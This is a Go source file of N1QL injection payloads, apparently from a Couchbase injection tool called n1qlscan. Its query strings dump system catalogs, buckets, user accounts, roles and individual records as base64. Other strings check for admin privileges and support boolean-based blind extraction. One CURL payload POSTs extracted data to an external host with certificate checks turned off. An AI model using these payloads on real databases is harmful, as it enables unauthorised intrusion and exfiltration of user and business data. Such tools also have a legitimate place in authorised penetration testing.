package payloads

var Version = `VERSION()`
var CbVersion = `DS_VERSION()`
var BucketData = `base64((select b.* from system:buckets as b order by meta().id))`
var KeyspaceData = `BASE64((SELECT k.* FROM system:keyspaces_info as k order by meta().id))`
var CurrentUser = `BASE64((SELECT id,name FROM system:my_user_info))`
var CurrentUserRoles = `BASE64((SELECT roles FROM system:my_user_info))`
var PreparedStatements = `base64((select p.* from system:prepareds as p ORDER BY meta().id))`
var Functions = `base64((select f.* from system:functions as f ORDER BY meta().id))`
var NodeData = `base64((select n.* from system:nodes as n ORDER BY meta().id))`
var AllUsers = `base64((select u.* from system:user_info as u order by meta().id))`
var SingleUser = `base64((select u.* from system:user_info as u where u.id="<user>" OR u.name="<user>"))`
var SingleBucket = `base64((select b.name from system:buckets as b where b.name="<bucket>"))`
var RecordCount = `base64((select raw count from system:keyspaces_info where name="<bucket>"))`
var SingleRecord = "base64((select n1qlscan.* from `<bucket>` as n1qlscan order by meta().id limit 1 offset <record>))"
var AllBucketNames = `base64((select raw b.name from system:buckets as b order by meta().id))`

// Is Admin Check
var IsAdminOne = "base64((select r from system:my_user_info unnest roles as r where r.`role`LIKE'%admin%' and (r.`role`!='bucket_admin' or r.`role`!='analytics_admin')))"
var IsAdminTwo = "base64((select r from system:my_user_info unnest roles as r where r.`role`='query_system_catalog'))"

// Curl Checks
var CurlPermissions = "base64((select r from system:my_user_info unnest roles as r where r.`role`='query_external_access'))"
var CurlCommand = "CURL('<ehost>',{'request':'POST','insecure':true,'data-urlencode':'n1qlscan='||<command>})"

var BoolStep = `"^.{<step>,}$"`
var BoolCharPre = `"^.{`
var BoolCharSuf = `}[<chars>].*$"`
